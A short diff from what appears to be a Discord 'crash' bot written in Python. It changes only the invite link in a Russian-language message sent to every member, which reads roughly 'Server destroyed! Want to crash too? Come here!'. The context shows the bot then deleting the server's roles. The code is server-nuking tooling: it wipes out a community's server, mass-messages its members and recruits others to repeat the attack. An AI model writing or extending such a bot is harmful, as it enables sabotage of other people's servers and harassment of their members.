@@ -106,7 +106,7 @@ async def crash(ctx):
      for i in members:
        if i is not Bot.user:
           try:
-            await i.send(f'Сервер {guild.name} уничтожен! Хочешь тоже крашать? Переходи! https://discord.gg/z8g9GRe')
+            await i.send(f'Сервер {guild.name} уничтожен! Хочешь тоже крашать? Переходи! https://discord.gg/ang3M7c93x')
           except:
                 pass
      for i in roles:  # Удаление ролей
